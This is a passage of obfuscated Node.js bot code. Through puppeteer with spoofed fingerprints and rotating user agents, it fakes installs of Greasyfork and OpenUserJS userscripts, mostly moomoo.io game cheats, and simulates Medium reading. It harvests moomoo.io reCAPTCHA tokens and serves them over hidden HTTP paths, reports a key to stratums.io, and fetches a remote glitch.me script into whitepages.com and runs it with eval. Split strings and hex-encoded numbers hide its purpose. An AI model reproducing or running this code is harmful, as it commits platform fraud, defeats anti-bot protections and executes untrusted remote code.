      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': U(0x7) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + U(0x3),
      'preRef': V(0x12, 'Ua$c') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + U(0xb) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + W(0xc) + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + W(0x5) + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + U(0x19) + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + U(0x6) + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x8c * 0x42 + -0x9b9 + -0x13d * -0x25
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2109 + -0x2 * 0xb0 + -0x1fa9)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1316 + 0x5a * -0x18 + -0xa42), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x511 * 0x6 + 0x641 * 0x5 + -0x7b), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xa7b + 0xc0b + -0x1686;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1e65 + -0x327 * 0x1 + -0x4 * -0x863; w < getRandomInt(0x1cc * -0x15 + 0x1 * -0x2287 + 0x4844, -0x1f61 + 0x5bc + 0x19aa); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x4 * -0x5d5d + 0x472 * -0x53 + 0xe5e2);
        }
      }();
    }, -0x15da + -0x3b * -0xd + 0x133f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = c,
        X = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x37e + 0x1b71 + -0x1eef;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate'](X(0x13) + 'ocumentEle' + Y(0x2) + 'HTML');
        if (log(z['slice'](0x7 * 0x3d7 + -0xdd1 + 0x2c * -0x4c, 0x16de + -0x162c + -0x20 * 0x4)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x444 + -0xb46c + -0x92ac * -0x2);
    }, -0x1 * -0x15dd + 0xc7 + -0x1640), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1e8e + 0x9c3 + 0x14cb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x11b * -0x1d + 0x611 + 0x25b6), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x37a + 0x20be + -0x1d44), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xe2508 + 0x1a4b53 + 0x19555);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x32d + -0x1f * -0x17 + -0x3e * 0x17);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xa39 + 0x2383 + 0x6 * -0x77e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x27 * -0xa4 + 0x3ad0 + 0x343c * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = c,
    Z = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1269 + 0x1b8 + -0x1420) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1 * 0xb96 + 0x4db * 0x3 + -0x1a26 * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x5d0 + 0x8f + 0x65f * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](0x41f * -0x8 + 0x202c + -0x44 * -0x3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x5e7 + -0x4e20 + 0x6f49),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x4235 + 0x309 * -0x13 + 0x1e86),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + Z(0x16, '[fEI') + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + a0(0x9) + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x24dc + 0x1df * -0x7 + -0x229 * 0xb; k < 0x1579 + -0x3 * 0x95 + -0x13b6; k++)
    setTimeout(f, (0xbe60 * -0x2 + 0xad3 * -0x6 + 0x2a812 * 0x1) * k * getRandomInt(-0x481 * 0x2 + -0x18e3 + 0x21e6, 0x18 * -0x2e + -0x1c87 + 0x20da));
  setInterval(() => {
    f();
    for (let l = 0x152 + 0x6ad * 0x2 + -0x272 * 0x6; l < -0x10ee * 0x1 + 0x1c13 + -0x25 * 0x4d; l++)
      setTimeout(f, (0x18f0 + 0x5 * -0x847 + -0x7 * -0x23d5) * l * getRandomInt(0x203d + 0x1e3f + -0x7 * 0x8ed, 0x66e + 0x1867 + -0x107 * 0x1e));
  }, 0x2d9ca8 + 0x1555f * 0x3b + 0x12311 * -0x3d);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
